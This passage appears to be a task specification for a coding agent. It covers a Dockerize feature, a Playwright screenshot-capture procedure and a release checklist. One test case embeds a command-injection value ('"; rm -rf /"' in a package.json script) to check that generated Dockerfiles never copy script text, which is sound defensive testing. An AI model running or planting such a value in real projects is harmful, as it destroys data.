In `ComposeTab.tsx` next to **New compose file** add **From a project…** → dialog `DockerizeDialog.tsx` (new file, +1): pick a project (`list_projects`), show detected kind + notes + the Dockerfile and compose in two read-only `CodeEditor`s (yaml / text), list `existing` files as "kept", buttons **Create files** and **Create and start** (start = `docker_compose_action up`, like `composeCreated` in `Docker.tsx`). Layout: copy `ComposeBuilderDialog.tsx` (container queries, no fixed widths).

### MCP
`ols_docker_dockerize{project_id, dry_run?: bool = true}`: dry-run ⇒ `PlanDockerize`; otherwise `CreateDockerize{overwrite_compose:false}` (**never overwrite**).

### Steps
1. `dockerize.rs` + unit tests with temp dirs: node (with `.nvmrc` 20, `scripts.dev`), php (`composer.json` `^8.2`, with and without `artisan`), python (`manage.py`; FastAPI main.py), static; existing Dockerfile kept; existing compose refused then backed-up when allowed; generated compose passes `check_text`; hostile `package.json` (`scripts.dev` containing `"; rm -rf /"`) — the command in the Dockerfile must be one of the fixed strings, never the script's text (assert the output doesn't contain `rm -rf`).
2. Commands, dispatch, TS, MCP + test, `api.rs` (no change).
3. UI dialog + button.
4. Docs: all of §0.1 plus `data_models.txt` (`DockerizePlan` incl. `php_extensions` / `unknown_extensions`), `api_reference.md`, `docs/MCP.md`, README Docker bullet, release notes ("Generate a Dockerfile and compose file for a project, including the PHP extensions it needs"), CHANGELOG, manuals; `full_documentation.md` must state the two PHP limits above **and** the "starting point, not guaranteed" rule (the disclaimer wording, the five-item checklist, the file header); the user manual section for Dockerize must contain the disclaimer sentence verbatim.

**Done when:** gate passes; every kind has a test; both hostile-input tests pass; every kind's plan carries the disclaimer, the five-item checklist and a `detected` list, and both generated files start with the `#` header; a Laravel project with `DB_CONNECTION=mysql` produces a Dockerfile that installs `pdo_mysql`; the installer image tag is a pinned version (not `latest`) and the commit body asks the maintainer to verify it.
**Do NOT:** execute project scripts; copy text from project files into generated files except the closed-set values above (version digits, script *names* and PHP extension names chosen from the fixed lists); overwrite anything without `overwrite_compose`; run `docker build` automatically; use `latest` for any image; write an invented digest; download anything yourself (the installer arrives only through Docker pulling the pinned image).

---

## Task 6 — Screenshots for the new tabs

**Goal:** README + website show the Images, Volumes and Reclaim-space views (dark + light), at the real image size.

### Method (this is how the existing ones were made — reproduce it)
1. `cd ui && npm run build && npx vite preview --port 4173 --strictPort &` (preview serves the **built** files).
2. Use the pre-installed Playwright (`require('playwright')` works from any directory; do not install). Start Chromium, `viewport 1600×860`, `deviceScaleFactor 1.2` (⇒ **1920×1032** output), `colorScheme: 'dark'|'light'`.
3. In `page.addInitScript` set `localStorage['ols-appearance'] = JSON.stringify({mode, presetId:'default', overrides:{sidebarIcons:'monochrome'}})` and fake the Tauri bridge:
   `window.__TAURI_INTERNALS__ = { transformCallback: () => n++, unregisterCallback(){}, metadata:{currentWindow:{label:'main'},currentWebview:{label:'main'}}, invoke: async (cmd,args) => { if(cmd!=='run_command') return String(cmd).startsWith('plugin:event')?1:null; switch(args.command.type){ … } } }`
   Answer these command types (shapes are in `ui/src/core/types/docker.ts`): `get_setting`→`{type:'setting',key,value:null}`, `get_docker_status`, `list_docker_containers`, `list_docker_images`, `list_docker_volumes`, `get_docker_disk_usage`, `plan_docker_prune`, `list_services` (`{type:'services',services:[…]}`), `list_tunnels`, `list_tasks`, default `{type:'ok'}`. **Never throw** for a command the page calls on load, or an error toast appears in the screenshot.
   Use believable data: 4–6 images (one untagged, one 1.2 GB), 3–4 volumes (one unnamed 64-hex name), disk usage ≈ 2.3 GB images / 20 MB reclaimable volumes.
4. Shots (per theme): `docker-images` (Images tab), `docker-volumes` (Volumes tab), `docker-reclaim` (click **Reclaim space**, wait 600 ms). Take `page.screenshot()` after `waitForTimeout(900)`.
5. **Look at each screenshot** (open the PNG) before saving: no error toast, no half-loaded skeleton, sidebar shows Docker highlighted.
6. Convert with Pillow: `Image.open(png).convert('RGB').save(path,'WEBP',quality=85,method=6)` ⇒ `assets/docker-images.webp`, `assets/docker-images-light.webp`, same for `volumes`, `reclaim`; copy the **dark** ones to `website/assets/img/` (website uses dark only). Expect ~60–100 KB each; if > 150 KB lower quality to 80.
7. Re-take `docker`, `docker-compose`, `docker-builder` too **only if** the UI of those pages changed since (it did: Images/Volumes tabs now appear in the tab bar) ⇒ yes, redo all six names so the tab bar matches.
8. **README.md:** in `## 📸 Tour` add pairs after the existing Docker ones, same markup (`<p align="center"><img width="49%" src="./assets/docker-images.webp" alt="…"> <img … -light.webp …><br><em>…</em></p>`), alts and captions in the existing style.
9. **index.html:** add two tabs + panels (`Images & volumes`, `Reclaim space`) copying the `panel-docker` block exactly (`id`/`aria-controls`/`data-target` consistent; `<img>` `width="1920" height="1032"` — verify with `Image.open(...).size`). Update the alt text of the `docker.webp` panel to mention the Images and Volumes tabs.
10. Verify the site: `python3 -m http.server 4180` in the repo root, open `/index.html`, click each new tab, screenshot the showcase, kill the server.
11. Optional but recommended: commit the capture script as `scripts/capture-docker-shots/capture.cjs` + a 10-line `README` there so the next person can rerun it (+1 file in `runtime.md`; it is not under `crates/` or `ui/src/`, so **do not** change the file count — only add a Log line).

**Done when:** all `.webp` ≤150 KB, README renders the pairs, website tabs switch, no console errors (check with `page.on('pageerror')`).
**Do NOT:** use PNG in the repo (AGENTS.md: `.webp`); stretch images (width/height must match the file); include real paths, usernames, or tokens in sample data (use `C:\OLS\sites\…`).

---

## Final checklist (after all six)
- [ ] `git status` clean; `git log --oneline` shows 6 commits (one per task), each with the two trailer lines.
- [ ] `specs/runtime.md`: `Total meaningful source files` equals the real count; last Log lines mention each task.
- [ ] `release-notes/v2.10.0.md`, `CHANGELOG.md`, both manuals updated and the two manuals identical (`diff`).
- [ ] Release date is still "in development"/"Unreleased" (the maintainer sets it at release).
- [ ] `release-notes/v2.10.0.md` has no "Coming before…" section left.
- [ ] Pushed: `git push origin release/2.10.0` (plain push; no force).
